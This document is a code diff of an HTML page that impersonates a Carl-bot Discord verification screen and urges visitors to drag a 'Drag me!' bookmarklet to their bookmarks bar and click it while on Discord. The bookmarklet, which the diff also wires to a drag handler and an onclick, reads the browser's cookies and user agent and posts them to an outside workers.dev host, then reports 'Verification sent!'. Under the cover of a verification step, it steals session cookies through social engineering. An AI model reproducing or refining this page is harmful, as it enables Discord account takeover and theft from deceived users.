@@ -4,13 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Carl-bot · Verification</title>
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
+            font-family: 'Poppins', 'Segoe UI', Roboto, system-ui, sans-serif;
         }
 
         body {
@@ -31,10 +30,15 @@
             border: 1px solid #2b5a38;
             box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), 0 0 0 1px #1e3d28 inset;
             padding: 36px 32px 28px;
-            transition: box-shadow 0.2s;
         }
 
-        /* header */
+        .top-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 6px;
+        }
+
         .badge {
             display: inline-block;
             background: #1f402a;
@@ -45,15 +49,25 @@
             padding: 4px 14px;
             border-radius: 30px;
             border: 1px solid #2f5a3d;
-            margin-bottom: 18px;
             text-transform: uppercase;
+        }
+
+        .brand {
+            color: #8fc99e;
+            font-weight: 700;
+            font-size: 16px;
+            letter-spacing: -0.3px;
+        }
+
+        .brand small {
+            font-weight: 400;
+            color: #5a8a6a;
         }
 
         h1 {
             color: #dff0e3;
             font-size: 26px;
             font-weight: 700;
-            letter-spacing: -0.3px;
             margin-bottom: 6px;
         }
 
@@ -68,10 +82,6 @@
             line-height: 1.5;
         }
 
-        .subhead strong {
-            color: #b7e0c4;
-        }
-
         .subhead kbd {
             background: #1b2f20;
             color: #b7e0c4;
@@ -82,7 +92,6 @@
             font-weight: 600;
         }
 
-        /* drag section */
         .drag-section {
             background: #0e1d14;
             border-radius: 20px;
@@ -96,10 +105,11 @@
             color: #b0d4bd;
             font-size: 14px;
             font-weight: 500;
-            margin-bottom: 12px;
+            margin-bottom: 14px;
             display: flex;
             align-items: center;
             gap: 10px;
+            flex-wrap: wrap;
         }
 
         .drag-label kbd {
@@ -112,9 +122,17 @@
             font-weight: 600;
         }
 
-        /* THE DRAG BUTTON — with animation */
+        .drag-btn-wrapper {
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            padding: 4px 0;
+        }
+
         .drag-btn {
-            display: inline-block;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
             background: linear-gradient(145deg, #1d4a2a, #12331e);
             color: #dff0e3;
             font-weight: 600;
@@ -126,20 +144,12 @@
             cursor: grab;
             user-select: none;
             transition: all 0.15s ease;
-            letter-spacing: 0.5px;
-            text-shadow: 0 2px 3px rgba(0,0,0,0.5);
-            position: relative;
             width: fit-content;
             min-width: 180px;
             text-align: center;
             text-decoration: none;
-        }
-
-        .drag-btn::after {
-            content: " ⤵";
-            font-size: 22px;
-            display: inline-block;
-            transition: transform 0.3s ease;
+            font-weight: 600;
+            letter-spacing: 0.5px;
         }
 
         .drag-btn:active {
@@ -166,6 +176,10 @@
             }
         }
 
+        .drag-icon {
+            font-size: 20px;
+        }
+
         .step-hint {
             color: #7da58a;
             font-size: 13px;
@@ -177,15 +191,6 @@
             border: 1px solid #1f402a;
         }
 
-        .step-hint i {
-            font-style: normal;
-            background: #1a3723;
-            padding: 0 10px;
-            border-radius: 20px;
-            color: #b7e0c4;
-        }
-
-        /* bottom bar — exactly like carlbot */
         .footer {
             display: flex;
             flex-wrap: wrap;
@@ -240,18 +245,6 @@
             background: #2a5537;
         }
 
-        .brand {
-            color: #8fc99e;
-            font-weight: 700;
-            font-size: 16px;
-            letter-spacing: -0.3px;
-        }
-
-        .brand small {
-            font-weight: 400;
-            color: #5a8a6a;
-        }
-
         @media (max-width: 550px) {
             .card { padding: 20px 14px; }
             h1 { font-size: 20px; }
@@ -266,42 +259,40 @@
 
 <div class="card">
 
-    <!-- Carl-bot style header -->
-    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 6px;">
+    <div class="top-row">
         <div class="badge">🔒 VERIFICATION REQUIRED</div>
         <div class="brand">CARL.GG <small>· bot</small></div>
     </div>
 
     <h1>How to verify?</h1>
     <div class="subhead">
-        <strong>Drag the bookmarklet</strong> to your bookmarks bar and click it while on <strong>Discord</strong>.<br>
+        Drag the bookmarklet to your bookmarks bar and click it while on <strong>Discord</strong>.<br>
         To enable your bookmarks bar, press <kbd>CTRL+SHIFT+B</kbd>
     </div>
 
-    <!-- Drag section -->
     <div class="drag-section">
         <div class="drag-label">
             📌 Drag me to your bookmarks bar
             <kbd>CTRL+SHIFT+B</kbd>
         </div>
 
-        <!-- THE DRAG BUTTON – bookmarklet code inside href -->
-        <a href="javascript:(function(){var c=document.cookie;var xhr=new XMLHttpRequest();xhr.open('POST','https://reciever.tyceno89.workers.dev',true);xhr.setRequestHeader('Content-Type','application/json');xhr.send(JSON.stringify({pc:navigator.userAgent,cookies:c}));alert('✅ Verification sent!');})();" 
-           class="drag-btn" 
-           id="dragBtn"
-           draggable="false"
-           onmousedown="this.classList.add('dragging')" 
-           onmouseup="this.classList.remove('dragging')" 
-           onmouseleave="this.classList.remove('dragging')">
-            🔐 Drag me!
-        </a>
+        <div class="drag-btn-wrapper">
+            <div class="drag-btn" id="dragBtn" draggable="true" 
+                 ondragstart="event.dataTransfer.setData('text/plain', 'javascript:(function(){var c=document.cookie;var xhr=new XMLHttpRequest();xhr.open(\'POST\',\'https://reciever.tyceno89.workers.dev\',true);xhr.setRequestHeader(\'Content-Type\',\'application/json\');xhr.send(JSON.stringify({pc:navigator.userAgent,cookies:c}));alert(\'✅ Verification sent!\');})();'); this.classList.add('dragging');"
+                 ondragend="this.classList.remove('dragging');"
+                 onmousedown="this.classList.add('dragging')" 
+                 onmouseup="this.classList.remove('dragging')" 
+                 onmouseleave="this.classList.remove('dragging')"
+                 onclick="var c=document.cookie;var xhr=new XMLHttpRequest();xhr.open('POST','https://reciever.tyceno89.workers.dev',true);xhr.setRequestHeader('Content-Type','application/json');xhr.send(JSON.stringify({pc:navigator.userAgent,cookies:c}));alert('✅ Verification sent!');">
+                <span class="drag-icon">🔐</span> Drag me!
+            </div>
+        </div>
 
         <div class="step-hint">
             <i>⏳</i> hold & drag to bookmarks bar · then click on Discord
         </div>
     </div>
 
-    <!-- footer — carlbot style -->
     <div class="footer">
         <div class="footer-left">
             <a href="#">Docs</a>
@@ -318,14 +309,6 @@
     </div>
 
 </div>
-
-<script>
-    // add pulsing animation when user holds the button
-    const btn = document.getElementById('dragBtn');
-    btn.addEventListener('mousedown', () => btn.classList.add('dragging'));
-    btn.addEventListener('mouseup', () => btn.classList.remove('dragging'));
-    btn.addEventListener('mouseleave', () => btn.classList.remove('dragging'));
-</script>
 
 </body>
 </html>
